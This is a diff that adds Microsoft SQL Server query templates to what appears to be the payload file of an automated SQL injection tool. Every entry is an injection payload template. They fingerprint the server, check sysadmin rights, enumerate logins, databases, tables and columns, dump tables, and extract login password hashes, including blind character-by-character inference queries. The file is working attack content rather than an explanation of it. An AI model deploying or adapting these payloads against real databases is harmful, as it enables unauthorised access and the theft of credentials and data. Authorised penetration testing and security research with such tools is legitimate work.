@@ -1,0 +1,67 @@
+    <!-- Microsoft SQL Server -->
+    <dbms value="Microsoft SQL Server">
+        <cast query="CAST(%s AS NVARCHAR(4000))"/>
+        <length query="LTRIM(STR(LEN(%s)))"/>
+        <isnull query="ISNULL(%s,' ')"/>
+        <delimiter query="+"/>
+        <limit query="SELECT TOP %d "/>
+        <limitregexp query="TOP\s+([\d]+)\s+.+?\s+FROM\s+.+?\s+WHERE\s+.+?\s+NOT\s+IN\s+\(SELECT\s+TOP\s+([\d]+)\s+"/>
+        <limitgroupstart query="2"/>
+        <limitgroupstop query="1"/>
+        <limitstring/>
+        <order query="ORDER BY %s ASC"/>
+        <count query="COUNT(%s)"/>
+        <comment query="--" query2="/*"/>
+        <substring query="SUBSTRING((%s),%d,%d)"/>
+        <concatenate query="%s+%s"/>
+        <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
+        <hex query="master.dbo.fn_varbintohexstr(CAST(%s AS VARBINARY(8000)))"/>
+        <inference query="UNICODE(SUBSTRING((%s),%d,1))>%d"/>
+        <banner query="SELECT @@VERSION"/>
+        <current_user query="SELECT SYSTEM_USER"/>
+        <current_db query="SELECT DB_NAME()"/>
+        <hostname query="@@SERVERNAME"/>
+        <table_comment query="SELECT value FROM fn_listextendedproperty(NULL,'schema','%s','table','%s',NULL,NULL)"/>
+        <column_comment query="SELECT value FROM fn_listextendedproperty(NULL,'schema','%s','table','%s','column','%s')"/>
+        <is_dba query="IS_SRVROLEMEMBER('sysadmin')=1" query2="IS_SRVROLEMEMBER('sysadmin','%s')=1"/>
+        <users>
+            <inband query="SELECT name FROM master..syslogins" query2="SELECT name FROM sys.sql_logins"/>
+            <!-- NOTE: in NOT IN kind of queries ORDER BY is a must -->
+            <blind query="SELECT TOP 1 name FROM master..syslogins WHERE name NOT IN (SELECT TOP %d name FROM master..syslogins ORDER BY name) ORDER BY name" query2="SELECT TOP 1 name FROM sys.sql_logins WHERE name NOT IN (SELECT TOP %d name FROM sys.sql_logins ORDER BY name) ORDER BY name" count="SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins" count2="SELECT LTRIM(STR(COUNT(name))) FROM sys.sql_logins"/>
+        </users>
+        <passwords>
+            <inband query="SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins" query2="SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins" condition="name"/>
+            <blind query="SELECT TOP 1 master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins WHERE name='%s' AND password NOT IN (SELECT TOP %d password FROM master..sysxlogins WHERE name='%s' ORDER BY password) ORDER BY password" query2="SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='%s' AND password_hash NOT IN (SELECT TOP %d password_hash FROM sys.sql_logins WHERE name='%s' ORDER BY password_hash) ORDER BY password_hash" count="SELECT LTRIM(STR(COUNT(password))) FROM master..sysxlogins WHERE name='%s'" count2="SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='%s'"/>
+        </passwords>
+        <!-- NOTE: in Microsoft SQL Server there is no query to enumerate DBMS users privileges -->
+        <privileges/>
+        <roles/>
+        <dbs>
+            <inband query="SELECT name FROM master..sysdatabases" query2="SELECT DB_NAME(%d)"/>
+            <blind query="SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP %d name FROM master..sysdatabases ORDER BY name) ORDER BY name" count="SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases"/>
+        </dbs>
+        <tables>
+            <inband query="SELECT %s..sysusers.name+'.'+%s..sysobjects.name FROM %s..sysobjects INNER JOIN %s..sysusers ON %s..sysobjects.uid = %s..sysusers.uid WHERE %s..sysobjects.xtype IN ('u','v')" query2="SELECT table_schema+'.'+table_name FROM information_schema.tables WHERE table_catalog='%s'" query3="SELECT name FROM %s..sysobjects WHERE xtype = 'U'"/>
+            <blind query="SELECT TOP 1 %s..sysusers.name+'.'+%s..sysobjects.name FROM %s..sysobjects INNER JOIN %s..sysusers ON %s..sysobjects.uid = %s..sysusers.uid WHERE %s..sysobjects.xtype IN ('u','v') AND %s..sysusers.name+'.'+%s..sysobjects.name NOT IN (SELECT TOP %d %s..sysusers.name+'.'+%s..sysobjects.name FROM %s..sysobjects INNER JOIN %s..sysusers ON %s..sysobjects.uid = %s..sysusers.uid WHERE %s..sysobjects.xtype IN ('u','v') ORDER BY %s..sysusers.name+'.'+%s..sysobjects.name) ORDER BY %s..sysusers.name+'.'+%s..sysobjects.name" count="SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE %s..sysobjects.xtype IN ('u','v')" query2="SELECT TOP 1 table_schema+'.'+table_name FROM information_schema.tables WHERE table_catalog='%s' AND table_schema+'.'+table_name NOT IN (SELECT TOP %d table_schema+'.'+table_name FROM information_schema.tables WHERE table_catalog='%s' ORDER BY table_schema+'.'+table_name) ORDER BY table_schema+'.'+table_name" count2="SELECT LTRIM(STR(COUNT(table_name))) FROM information_schema.tables WHERE table_catalog='%s'" query3="SELECT TOP 1 name FROM %s..sysobjects WHERE xtype = 'U' AND name NOT IN (SELECT TOP %d name FROM %s..sysobjects WHERE xtype = 'U' ORDER BY name) ORDER BY name" count3="SELECT COUNT(name) FROM %s..sysobjects WHERE xtype = 'U'"/>
+        </tables>
+        <columns>
+            <inband query="SELECT %s..syscolumns.name,TYPE_NAME(%s..syscolumns.xtype) FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" query2="SELECT COL_NAME(OBJECT_ID('%s.%s'),%d)" condition="[DB]..syscolumns.name"/>
+            <blind query="SELECT TOP 1 %s..syscolumns.name FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s' AND %s..syscolumns.name NOT IN (SELECT TOP %d %s..syscolumns.name FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s' ORDER BY %s..syscolumns.name) ORDER BY %s..syscolumns.name" query2="SELECT TYPE_NAME(%s..syscolumns.xtype) FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.name='%s' AND %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" query3="SELECT COL_NAME(OBJECT_ID('%s.%s'),%d)" count="SELECT LTRIM(STR(COUNT(name))) FROM %s..syscolumns WHERE id=(SELECT id FROM %s..sysobjects WHERE name='%s')" condition="[DB]..syscolumns.name"/>
+        </columns>
+        <dump_table>
+            <inband query="SELECT %s FROM %s.%s"/>
+            <blind query="SELECT MIN(%s) FROM %s WHERE CONVERT(NVARCHAR(4000),%s)>'%s'" query2="SELECT MAX(%s) FROM %s WHERE CONVERT(NVARCHAR(4000),%s) LIKE '%s'" query3="SELECT %s FROM (SELECT %s, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM %s)x WHERE LIMIT=%d" count="SELECT LTRIM(STR(COUNT(*))) FROM %s" count2="SELECT LTRIM(STR(COUNT(DISTINCT(%s)))) FROM %s"/>
+        </dump_table>
+        <search_db>
+            <inband query="SELECT name FROM master..sysdatabases WHERE %s" condition="name"/>
+            <blind query="SELECT name FROM master..sysdatabases WHERE %s" count="SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases WHERE %s" condition="name"/>
+        </search_db>
+        <search_table>
+            <inband query="SELECT name FROM %s..sysobjects WHERE %s..sysobjects.xtype IN ('u','v') AND " condition="name" condition2="name"/>
+            <blind query="SELECT name FROM %s..sysobjects WHERE %s..sysobjects.xtype IN ('u','v') " count="SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE %s..sysobjects.xtype IN ('u','v')" condition="name" condition2="name"/>
+        </search_table>
+        <search_column>
+            <inband query="SELECT %s..sysobjects.name FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.xtype IN ('u','v')" condition="[DB]..syscolumns.name" condition2="[DB]..sysobjects.name"/>
+            <blind query="SELECT %s..sysobjects.name FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.xtype IN ('u','v')" count="SELECT COUNT(%s..sysobjects.name) FROM %s..syscolumns,%s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.xtype IN ('u','v')" condition="[DB]..syscolumns.name" condition2="[DB]..sysobjects.name"/>
+        </search_column>
+    </dbms>
